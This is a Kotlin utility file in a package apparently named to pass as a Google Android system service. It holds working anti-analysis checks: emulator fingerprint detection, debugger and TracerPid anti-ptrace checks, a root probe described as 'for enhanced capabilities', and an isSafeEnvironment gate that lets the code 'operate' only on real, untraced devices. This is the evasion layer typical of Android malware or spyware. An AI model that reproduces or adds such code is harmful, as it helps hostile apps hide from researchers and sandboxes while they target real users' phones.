package com.google.android.systemservice.utils

import android.content.Context
import android.os.Build
import android.os.Debug
import java.io.BufferedReader
import java.io.File
import java.io.FileReader

object EnvironmentCheck {

    /**
     * Returns true if running on a real device (not emulator)
     */
    fun isRealDevice(): Boolean {
        val dominated = (Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.BOARD == "QC_Reference_Phone"
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.HOST.startsWith("Build")
                || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
                || "google_sdk" == Build.PRODUCT
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu"))
        return !dominated
    }

    /**
     * Returns true if a debugger is attached
     */
    fun isDebuggerAttached(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }

    /**
     * Check TracerPid in /proc/self/status (anti-ptrace)
     */
    fun isBeingTraced(): Boolean {
        return try {
            val reader = BufferedReader(FileReader("/proc/self/status"))
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                if (line?.startsWith("TracerPid:") == true) {
                    val pid = line?.substringAfter("TracerPid:")?.trim()?.toIntOrNull() ?: 0
                    reader.close()
                    return pid != 0
                }
            }
            reader.close()
            false
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check if device is rooted (for enhanced capabilities)
     */
    fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su", "/data/local/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su",
            "/data/adb/magisk"
        )
        return paths.any { File(it).exists() } || canExecuteSu()
    }

    private fun canExecuteSu(): Boolean {
        return try {
            val proc = Runtime.getRuntime().exec("which su")
            val result = proc.inputStream.bufferedReader().use { it.readLine() }
            proc.destroy()
            result != null
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Full environment safety check
     * Returns true if safe to operate (real device, no debugger)
     */
    fun isSafeEnvironment(): Boolean {
        return isRealDevice() && !isDebuggerAttached() && !isBeingTraced()
    }
}
